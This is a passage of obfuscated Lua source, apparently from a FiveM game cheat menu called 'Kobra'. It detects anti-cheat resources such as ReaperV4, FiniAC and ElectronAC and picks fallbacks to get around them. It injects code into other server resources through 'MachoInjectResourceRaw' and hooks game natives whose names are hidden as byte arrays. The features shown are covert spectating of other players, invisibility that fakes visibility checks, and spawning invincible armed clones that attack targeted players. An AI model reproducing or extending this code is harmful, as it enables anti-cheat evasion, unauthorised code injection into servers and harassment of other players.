            ]],v207,v320));v208=v208 + (2 -1) ;break;end end end end v204:Notify("success","Kobra",string.format("Object '%s' spawned on %d/%d player(s)!",v206,v208, #v205),6962 -(1300 + 662) );end;v12.HandleSpectateToggle=function(v209,v210,v211) if  not v210 then local v517=0;while true do if (v517==0) then v209:Notify("error","Kobra","Invalid player ID provided!",9420 -6420 );return;end end end local v212=tonumber(v210);if  not v212 then local v518=1755 -(1178 + 577) ;while true do if (v518==(0 + 0)) then v209:Notify("error","Kobra","Invalid server ID format!",8868 -5868 );return;end end end if (v212==tonumber(GetPlayerServerId(PlayerId()))) then v209:Notify("error","Kobra","You cannot spectate yourself!",4405 -(851 + 554) );return;end if v211 then v209:Notify("success","Kobra",("You have started spectating the player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(v212)) or "Unknown" ,v212),2653 + 347 );else v209:Notify("error","Kobra",("You have stopped spectating the player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(v212)) or "Unknown" ,v212),8320 -5320 );end local v213=GetResourceState("ReaperV4")=="started" ;if v213 then print("Spectate Fallback #3 (ReaperV4 detected, running direct)");if  not GetPlayerName(GetPlayerFromServerId(v212)) then v209:Notify("error","Kobra","Target player not found!",6515 -3515 );print("[ReaperV4 Spectate] Error: No player found for server ID:",v212);return;end local v519=string.format([[
            local function HookNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    print("[ReaperV4 Spectate] Warning: Native " .. nativeName .. " not found or not a function")
                    return
                end
                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                if not f then print("[ReaperV4 Spectate] Error: Global function " .. k .. " not found") end
                return f
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            local function _t()
                local createThread = _G[_d(_b("CreateThread"))]
                if not createThread then print("[ReaperV4 Spectate] Error: CreateThread not found") end
                return createThread
            end
            HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
            HookNative("NetworkSetInSpectatorMode", function(originalFn, ...) return originalFn(...) end)
            HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
            HookNative("NetworkSetEntityInvisibleToNetwork", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
            HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
            HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            local function findClientIdByServerId(sid)
                local players = _g(_b("GetActivePlayers"))()
                if not players then
                    print("[ReaperV4 Spectate] Error: GetActivePlayers returned nil")
                    return -1
                end
                print("[ReaperV4 Spectate] Active players:", table.concat(players, ", "))
                for _, pid in ipairs(players) do
                    local serverId = _g(_b("GetPlayerServerId"))(pid)
                    print("[ReaperV4 Spectate] Player Client ID:", pid, "Server ID:", serverId)
                    if serverId == sid then
                        print("[ReaperV4 Spectate] Found client ID:", pid, "for server ID:", sid)
                        return pid
                    end
                end
                print("[ReaperV4 Spectate] Error: No client ID found for server ID:", sid)
                return -1
            end
            local function stopSpectate()
                if not _G.osintSpectate or not _G.osintSpectate.enabled then
                    print("[ReaperV4 Spectate] StopSpectate: Not currently spectating")
                    return
                end
                local me = _g(_b("PlayerPedId"))()
                if not me then
                    print("[ReaperV4 Spectate] Error: PlayerPedId returned nil")
                    return
                end
                local back = _G.osintSpectate.back
                local heading = _G.osintSpectate.heading
                local wasVisible = _G.osintSpectate.wasVisible
                if back then
                    _g(_b("RequestCollisionAtCoord"))(back.x, back.y, back.z)
                end
                local success, err = pcall(function()
                    _g(_b("NetworkSetInSpectatorMode"))(false, me)
                end)
                if not success then
                    print("[ReaperV4 Spectate] Error: NetworkSetInSpectatorMode failed:", err)
                end
                _g(_b("FreezeEntityPosition"))(me, false)
                if back then
                    _g(_b("SetEntityCoords"))(me, back.x, back.y, back.z, false, false, false, true)
                end
                if heading then
                    _g(_b("SetEntityHeading"))(me, heading)
                end
                _g(_b("SetEntityCollision"))(me, true, true)
                _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                _g(_b("SetEntityInvincible"))(me, false)
                _G.osintSpectate.enabled = false
                _G.osintSpectate.targetSid = nil
                print("[ReaperV4 Spectate] Stopped spectating")
            end
            local function startSpectate(targetSid)
                local me = _g(_b("PlayerPedId"))()
                if not me then
                    print("[ReaperV4 Spectate] Error: PlayerPedId returned nil")
                    return
                end
                local myCoords = _g(_b("GetEntityCoords"))(me)
                if not myCoords then
                    print("[ReaperV4 Spectate] Error: GetEntityCoords returned nil")
                    return
                end
                local myHeading = _g(_b("GetEntityHeading"))(me)
                if not _G.osintSpectate then _G.osintSpectate = {} end
                _G.osintSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z - 1.0)
                _G.osintSpectate.heading = myHeading
                _G.osintSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                _G.osintSpectate.enabled = true
                _G.osintSpectate.targetSid = targetSid
                local clientId = findClientIdByServerId(targetSid)
                local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                if clientId == -1 or targetPed == 0 then
                    print("[ReaperV4 Spectate] Error: Invalid client ID or target ped not found for server ID:", targetSid)
                    _G.osintSpectate.enabled = false
                    TriggerEvent('Kobra:Notify', "error", "Kobra", "Target player not found!", 3000)
                    return
                end
                local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                if not tCoords then
                    print("[ReaperV4 Spectate] Error: GetEntityCoords for target ped returned nil")
                    _G.osintSpectate.enabled = false
                    TriggerEvent('Kobra:Notify', "error", "Kobra", "Failed to get target position!", 3000)
                    return
                end
                _g(_b("RequestCollisionAtCoord"))(tCoords.x, tCoords.y, tCoords.z)
                _g(_b("SetEntityVisible"))(me, false, false)
                _g(_b("SetEntityCollision"))(me, false, false)
                _g(_b("NetworkSetEntityInvisibleToNetwork"))(me, true)
                _g(_b("SetEntityInvincible"))(me, true)
                local zOffset = 15.0 -- Default offset since GetGroundZFor_3dCoord is unavailable
                _g(_b("SetEntityCoords"))(me, tCoords.x, tCoords.y, tCoords.z + zOffset, false, false, false, true)
                _w(300)
                _g(_b("FreezeEntityPosition"))(me, true)
                local success, err = pcall(function()
                    _g(_b("NetworkSetInSpectatorMode"))(true, targetPed)
                end)
                if not success then
                    print("[ReaperV4 Spectate] Error: NetworkSetInSpectatorMode failed:", err)
                    _G.osintSpectate.enabled = false
                    TriggerEvent('Kobra:Notify', "error", "Kobra", "Spectator mode not supported!", 3000)
                    return
                end
                print("[ReaperV4 Spectate] Started spectating server ID:", targetSid, "on ped:", targetPed)
                _t()(function()
                    while _G.osintSpectate and _G.osintSpectate.enabled do
                        local cid = findClientIdByServerId(_G.osintSpectate.targetSid or targetSid)
                        if cid == -1 then
                            print("[ReaperV4 Spectate] Error: Client ID not found in loop for server ID:", targetSid)
                            break
                        end
                        local ped = _g(_b("GetPlayerPed"))(cid)
                        if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then
                            print("[ReaperV4 Spectate] Error: Target ped not found or does not exist")
                            break
                        end
                        local pc = _g(_b("GetEntityCoords"))(ped)
                        if not pc then
                            print("[ReaperV4 Spectate] Error: GetEntityCoords returned nil in loop")
                            break
                        end
                        _g(_b("SetEntityCoords"))(me, pc.x, pc.y, pc.z + zOffset, false, false, false, true)
                        _w(400)
                    end
                    stopSpectate()
                end)
            end
            local enable = %s
            local sid = %d
            if enable then
                print("[ReaperV4 Spectate] Starting spectate for server ID:", sid)
                startSpectate(sid)
            else
                print("[ReaperV4 Spectate] Stopping spectate")
                stopSpectate()
            end
        ]],tostring(v211),v212);local v520,v521=load(v519);if v520 then local v679,v680=pcall(v520);if  not v679 then print("[ReaperV4 Spectate] Execution error:",v680);v209:Notify("error","Kobra","Failed to execute spectate code!",3302 -(115 + 187) );else print("[ReaperV4 Spectate] Code executed successfully");end else local v681=0 + 0 ;while true do if (v681==(0 + 0)) then print("[ReaperV4 Spectate] Load error:",v521);v209:Notify("error","Kobra","Failed to load spectate code!",11822 -8822 );break;end end end elseif ((GetResourceState("FiniAC")=="started") or (GetResourceState("ElectronAC")=="started")) then local v682=1161 -(160 + 1001) ;while true do if (v682==(0 + 0)) then print("Spectate Fallback #1");MachoInjectResourceRaw("any",string.format([[
                local function HookNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end
                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end
                local function _w(n)
                    return Citizen.Wait(n)
                end
                local function _t()
                    return _G[_d(_b("CreateThread"))]
                end
                HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetGroundZFor_3dCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                HookNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                HookNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                HookNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                local function Clamp(val, min, max)
                    if val < min then return min end
                    if val > max then return max end
                    return val
                end
                local function findClientIdByServerId(sid)
                    local players = _g(_b("GetActivePlayers"))()
                    for _, pid in ipairs(players) do
                        if _g(_b("GetPlayerServerId"))(pid) == sid then
                            return pid
                        end
                    end
                    return -1
                end
                local function stopSpectate()
                    if not _G.osintSpectate or not _G.osintSpectate.enabled then return end
                    local me = _g(_b("PlayerPedId"))()
                    local back = _G.osintSpectate.back
                    local heading = _G.osintSpectate.heading
                    local wasVisible = _G.osintSpectate.wasVisible
                    if _G.osintSpectate.camera then
                        _g(_b("RenderScriptCams"))(false, false, 0, true, true)
                        _g(_b("DestroyCam"))(_G.osintSpectate.camera, false)
                        _G.osintSpectate.camera = nil
                    end
                    if back then _g(_b("RequestCollisionAtCoord"))(back) end
                    _g(_b("FreezeEntityPosition"))(me, false)
                    if back then
                        local valid, groundZ = _g(_b("GetGroundZFor_3dCoord"))(back.x, back.y, back.z, false)
                        local targetCoords = valid and vector3(back.x, back.y, groundZ + 1.0) or back
                        _g(_b("SetEntityCoords"))(me, targetCoords.x, targetCoords.y, targetCoords.z, false, false, false, true)
                    end
                    if heading then _g(_b("SetEntityHeading"))(me, heading) end
                    _g(_b("SetEntityCollision"))(me, true, true)
                    _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                    _G.osintSpectate.enabled = false
                    _G.osintSpectate.targetSid = nil
                    _g(_b("SetFocusEntity"))(me)
                end
                local function startSpectate(targetSid)
                    local me = _g(_b("PlayerPedId"))()
                    local myCoords = _g(_b("GetEntityCoords"))(me)
                    local myHeading = _g(_b("GetEntityHeading"))(me)
                    if not _G.osintSpectate then _G.osintSpectate = {} end
                    _G.osintSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z)
                    _G.osintSpectate.heading = myHeading
                    _G.osintSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                    _G.osintSpectate.enabled = true
                    _G.osintSpectate.targetSid = targetSid
                    local clientId = findClientIdByServerId(targetSid)
                    local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                    if clientId == -1 or targetPed == 0 then
                        _G.osintSpectate.enabled = false
                        return
                    end
                    local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                    _g(_b("RequestCollisionAtCoord"))(tCoords)
                    _g(_b("SetEntityVisible"))(me, false, false)
                    _g(_b("SetEntityCollision"))(me, false, false)
                    _g(_b("SetEntityInvincible"))(me, true)
                    local zOffset = 3.0
                    local cam = _g(_b("CreateCam"))("DEFAULT_SCRIPTED_CAMERA", true)
                    _G.osintSpectate.camera = cam
                    _g(_b("SetCamCoord"))(cam, tCoords.x, tCoords.y, tCoords.z + zOffset)
                    _g(_b("SetCamRot"))(cam, -30.0, 0.0, _g(_b("GetEntityHeading"))(targetPed), 2)
                    _g(_b("RenderScriptCams"))(true, false, 0, true, true)
                    _t()(function()
                        local cameraReady = false
                        _w(550)
                        cameraReady = true
                        while _G.osintSpectate and _G.osintSpectate.enabled and cameraReady do
                            local cid = findClientIdByServerId(_G.osintSpectate.targetSid or targetSid)
                            if cid == -1 then break end
                            local ped = _g(_b("GetPlayerPed"))(cid)
                            if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then break end
                            local pc = _g(_b("GetEntityCoords"))(ped)
                            _g(_b("SetCamCoord"))(cam, pc.x, pc.y, pc.z + zOffset)
                            local camRot = _g(_b("GetCamRot"))(cam, 2)
                            local x = _g(_b("GetDisabledControlNormal"))(0, 1)
                            local y = _g(_b("GetDisabledControlNormal"))(0, 2)
                            local newPitch = Clamp(camRot.x - y * 5, -89.0, 89.0)
                            local newYaw = camRot.z - x * 5
                            _g(_b("SetCamRot"))(cam, newPitch, camRot.y, newYaw, 2)
                            _g(_b("SetFocusPosAndVel"))(pc.x, pc.y, pc.z, 0.0, 0.0, 0.0)
                            _w(0)
                        end
                        stopSpectate()
                    end)
                end
                local enable = %s
                local sid = %d
                if enable then
                    startSpectate(sid)
                else
                    stopSpectate()
                end
            ]],tostring(v211),v212));break;end end else local v683=0 + 0 ;while true do if (v683==0) then print("Spectate Fallback #2");MachoInjectResourceRaw("monitor",string.format([[
                local function HookNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end
                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end
                local function _w(n)
                    return Citizen.Wait(n)
                end
                local function _t()
                    return _G[_d(_b("CreateThread"))]
                end
                HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("NetworkSetInSpectatorMode", function(originalFn, ...) return originalFn(...) end)
                HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("NetworkSetEntityInvisibleToNetwork", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetGroundZFor_3dCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                local function findClientIdByServerId(sid)
                    local players = _g(_b("GetActivePlayers"))()
                    for _, pid in ipairs(players) do
                        if _g(_b("GetPlayerServerId"))(pid) == sid then
                            return pid
                        end
                    end
                    return -1
                end
                local function stopSpectate()
                    if not _G.osintSpectate or not _G.osintSpectate.enabled then return end
                    local me = _g(_b("PlayerPedId"))()
                    local back = _G.osintSpectate.back
                    local heading = _G.osintSpectate.heading
                    local wasVisible = _G.osintSpectate.wasVisible
                    if back then _g(_b("RequestCollisionAtCoord"))(back) end
                    _g(_b("NetworkSetInSpectatorMode"))(false, me)
                    _g(_b("FreezeEntityPosition"))(me, false)
                    if back then _g(_b("SetEntityCoords"))(me, back.x, back.y, back.z, false, false, false, true) end
                    if heading then _g(_b("SetEntityHeading"))(me, heading) end
                    _g(_b("SetEntityCollision"))(me, true, true)
                    _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                    _G.osintSpectate.enabled = false
                    _G.osintSpectate.targetSid = nil
                end
                local function startSpectate(targetSid)
                    local me = _g(_b("PlayerPedId"))()
                    local myCoords = _g(_b("GetEntityCoords"))(me)
                    local myHeading = _g(_b("GetEntityHeading"))(me)
                    if not _G.osintSpectate then _G.osintSpectate = {} end
                    _G.osintSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z - 1.0)
                    _G.osintSpectate.heading = myHeading
                    _G.osintSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                    _G.osintSpectate.enabled = true
                    _G.osintSpectate.targetSid = targetSid
                    local clientId = findClientIdByServerId(targetSid)
                    local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                    if clientId == -1 or targetPed == 0 then
                        _G.osintSpectate.enabled = false
                        return
                    end
                    local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                    _g(_b("RequestCollisionAtCoord"))(tCoords)
                    _g(_b("SetEntityVisible"))(me, false, false)
                    _g(_b("SetEntityCollision"))(me, false, false)
                    _g(_b("NetworkSetEntityInvisibleToNetwork"))(me, true)
                    _g(_b("SetEntityInvincible"))(me, true)
                    local groundZ = tCoords.z
                    local foundGround, zPos = _g(_b("GetGroundZFor_3dCoord"))(tCoords.x, tCoords.y, tCoords.z, false)
                    if foundGround then
                        groundZ = zPos
                    end
                    local zOffset = math.max(15.0, tCoords.z - groundZ + 5.0)
                    _g(_b("SetEntityCoords"))(me, tCoords.x, tCoords.y, tCoords.z - zOffset, false, false, false, true)
                    _w(300)
                    _g(_b("FreezeEntityPosition"))(me, true)
                    _g(_b("NetworkSetInSpectatorMode"))(true, targetPed)
                    _t()(function()
                        while _G.osintSpectate and _G.osintSpectate.enabled do
                            local cid = findClientIdByServerId(_G.osintSpectate.targetSid or targetSid)
                            if cid == -1 then break end
                            local ped = _g(_b("GetPlayerPed"))(cid)
                            if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then break end
                            local pc = _g(_b("GetEntityCoords"))(ped)
                            local groundZ = pc.z
                            local foundGround, zPos = _g(_b("GetGroundZFor_3dCoord"))(pc.x, pc.y, pc.z, false)
                            if foundGround then
                                groundZ = zPos
                            end
                            local zOffset = math.max(15.0, pc.z - groundZ + 5.0)
                            _g(_b("SetEntityCoords"))(me, pc.x, pc.y, pc.z - zOffset, false, false, false, true)
                            _w(400)
                        end
                        stopSpectate()
                    end)
                end
                local enable = %s
                local sid = %d
                if enable then
                    startSpectate(sid)
                else
                    stopSpectate()
                end
            ]],tostring(v211),v212));break;end end end end;local v73={"envi-medic","envi-hud","envi-yoga","envi-chopshop","envi-chopshop-v2","envi-foodtrucks","envi-dumpsters","envi-prescriptions","envi-druglabs","lation_laundering"};local function v74() local v214=142 -(96 + 46) ;while true do if (v214==(777 -(643 + 134))) then for v684,v685 in ipairs(v73) do if (GetResourceState(v685)=="started") then return v685;end end return nil;end end end local v75=nil;if ((GetResourceState("es_extended")=="started") and (GetResourceState("timeless-emotes")=="started")) then v75="es_extended";elseif ((GetResourceState("core")=="started") and (GetResourceState("timeless-emotes")=="started")) then v75="core";end v12.EnableInvisibility=function(v215) local function v216(v321,v322) local v323=_G[v321];if ( not v323 or (type(v323)~="function")) then return;end _G[v321]=function(...) return v322(v323,...);end;end v216("CreateThread",function(v324,...) return v324(...);end);v216("PlayerPedId",function(v325,...) return v325(...);end);v216("IsEntityVisible",function(v326,...) return true;end);v216("IsEntityVisibleToScript",function(v327,...) return true;end);v216("SetEntityVisible",function(v328,v329,v330,v331) local v332=0;while true do if (v332==(0 + 0)) then if (_G.osintInvisibility and _G.osintInvisibility.enabled) then return v328(v329,false,v331);end return v328(v329,v330,v331);end end end);if  not _G.osintInvisibility then _G.osintInvisibility={enabled=false,wasVisible=true};end if  not _G.osintInvisibility.enabled then local v522=0;local v523;while true do if (v522==0) then _G.osintInvisibility.enabled=true;v523=PlayerPedId();v522=2 -1 ;end if (v522==2) then CreateThread(function() while _G.osintInvisibility and _G.osintInvisibility.enabled  do local v871=PlayerPedId();if (v871 and DoesEntityExist(v871)) then SetEntityVisible(v871,false,false);end Wait(500);end end);break;end if (v522==1) then _G.osintInvisibility.wasVisible=IsEntityVisible(v523);SetEntityVisible(v523,false,false);v522=7 -5 ;end end end end;v12.DisableInvisibility=function(v217) if (_G.osintInvisibility and _G.osintInvisibility.enabled) then _G.osintInvisibility.enabled=false;local v524=PlayerPedId();if (v524 and DoesEntityExist(v524)) then SetEntityVisible(v524,_G.osintInvisibility.wasVisible,false);end end end;v12.HandleAttackClonePlayer=function(v218,v219) local v220=0 + 0 ;local v221;while true do if (v220==(0 -0)) then if ( not v219 or ( #v219==(0 -0))) then return;end v221=table.concat(v219,",");v220=720 -(316 + 403) ;end if (v220==(2 + 0)) then MachoInjectResourceRaw("monitor",string.format([[
        local function decode(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function g(n)
            return _G[decode(n)]
        end
        local function wait(n)
            return Citizen.Wait(n)
        end
        local function findClientIdByServerId(sid)
            local players = g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()
            for _, pid in ipairs(players) do
                if g({71,101,116,80,108,97,121,101,114,83,101,114,118,101,114,73,100})(pid) == sid then
                    return pid
                end
            end
            return nil
        end
        local function copyPedAppearance(sourcePed, targetPed)
            for i = 0, 11 do
                local drawable = g({71,101,116,80,101,100,68,114,97,119,97,98,108,101,86,97,114,105,97,116,105,111,110})(sourcePed, i)
                local texture = g({71,101,116,80,101,100,84,101,120,116,117,114,101,86,97,114,105,97,116,105,111,110})(sourcePed, i)
                g({83,101,116,80,101,100,67,111,109,112,111,110,101,110,116,86,97,114,105,97,116,105,111,110})(targetPed, i, drawable, texture, 2)
            end
            for i = 0, 7 do
                local propIndex = g({71,101,116,80,101,100,80,114,111,112,73,110,100,101,120})(sourcePed, i)
                local propTexture = g({71,101,116,80,101,100,80,114,111,112,84,101,120,116,117,114,101,73,110,100,101,120})(sourcePed, i)
                if propIndex ~= -1 then
                    g({83,101,116,80,101,100,80,114,111,112})(targetPed, i, propIndex, propTexture)
                else
                    g({67,108,101,97,114,80,101,100,80,114,111,112})(targetPed, i)
                end
            end
            local headBlendData = {g({71,101,116,80,101,100,72,101,97,100,66,108,101,110,100,68,97,116,97})(sourcePed)}
            if headBlendData[1] then
                g({83,101,116,80,101,100,72,101,97,100,66,108,101,110,100,68,97,116,97})(
                    targetPed,
                    headBlendData[2], -- shapeFirst
                    headBlendData[3], -- shapeSecond
                    headBlendData[4], -- shapeThird
                    headBlendData[5], -- skinFirst
                    headBlendData[6], -- skinSecond
                    headBlendData[7], -- skinThird
                    headBlendData[8], -- shapeMix
                    headBlendData[9], -- skinMix
                    headBlendData[10] -- thirdMix
                )
            end
        end
        local function clonePed(ped)
            local coords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(ped)
            local heading = g({71,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103})(ped)
            local modelHash = g({71,101,116,69,110,116,105,116,121,77,111,100,101,108})(ped)
            g({82,101,113,117,101,115,116,77,111,100,101,108})(modelHash)
            local timeout = 0
            while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(modelHash) and timeout < 500 do
                wait(10)
                timeout = timeout + 1
            end
            if not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(modelHash) then return end
            -- Spawn ped 2 units away from player
            local spawnRadius = 2.0
            local spawnX = coords.x + (math.random() * 2 - 1) * spawnRadius
            local spawnY = coords.y + (math.random() * 2 - 1) * spawnRadius
            local spawnZ = coords.z
            local clone = g({67,114,101,97,116,101,80,101,100})(4, modelHash, spawnX, spawnY, spawnZ, heading, true, true)
            if clone and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(clone) then
                copyPedAppearance(ped, clone)
                g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})(clone, true, true)
                g({83,101,116,77,111,100,101,108,65,115,78,111,76,111,110,103,101,114,78,101,101,100,101,100})(modelHash)
                local cloneGroup = g({65,100,100,82,101,108,97,116,105,111,110,115,104,105,112,71,114,111,117,112})("HOSTILE_CLONE_" .. tostring(clone))
                g({83,101,116,80,101,100,82,101,108,97,116,105,111,110,115,104,105,112,71,114,111,117,112,72,97,115,104})(clone, cloneGroup)
                g({83,101,116,82,101,108,97,116,105,111,110,115,104,105,112,66,101,116,119,101,101,110,71,114,111,117,112,115})(5, cloneGroup, g({71,101,116,72,97,115,104,75,101,121})("PLAYER"))
                g({83,101,116,82,101,108,97,116,105,111,110,115,104,105,112,66,101,116,119,101,101,110,71,114,111,117,112,115})(5, g({71,101,116,72,97,115,104,75,101,121})("PLAYER"), cloneGroup)
                
                local weaponHash = g({71,101,116,72,97,115,104,75,101,121})(decode({87,69,65,80,79,78,95,83,84,85,78,71,85,78}))
                g({71,105,118,101,87,101,97,112,111,110,84,111,80,101,100})(clone, weaponHash, 1000, false, true)
                local weaponEntity = g({71,101,116,67,117,114,114,101,110,116,80,101,100,87,101,97,112,111,110,69,110,116,105,116,121,73,110,100,101,120})(clone)
                if weaponEntity and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(weaponEntity) then
                    g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})(weaponEntity, true, true)
                end
                g({83,101,116,80,101,100,68,114,111,112,115,87,101,97,112,111,110,115,87,104,101,110,68,101,97,100})(clone, false)
                g({83,101,116,80,101,100,67,97,110,83,119,105,116,99,104,87,101,97,112,111,110})(clone, false)
                g({84,97,115,107,67,111,109,98,97,116,80,101,100})(clone, ped, 0, 16)
                g({83,101,116,80,101,100,67,111,109,98,97,116,65,116,116,114,105,98,117,116,101,115})(clone, 0, true) -- Always aggressive
                g({83,101,116,80,101,100,70,108,101,101,65,116,116,114,105,98,117,116,101,115})(clone, 0, false) -- Prevent fleeing
                g({83,101,116,69,110,116,105,116,121,73,110,118,105,110,99,105,98,108,101})(clone, true)
                g({83,101,116,80,101,100,67,97,110,82,97,103,100,111,108,108})(clone, false)
            end
        end
        local playerIds = {%s}
        for _, targetServerId in ipairs(playerIds) do
            local clientId = findClientIdByServerId(targetServerId)
            local ped = clientId and g({71,101,116,80,108,97,121,101,114,80,101,100})(clientId) or nil
            if ped and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(ped) then
                clonePed(ped)
            end
        end
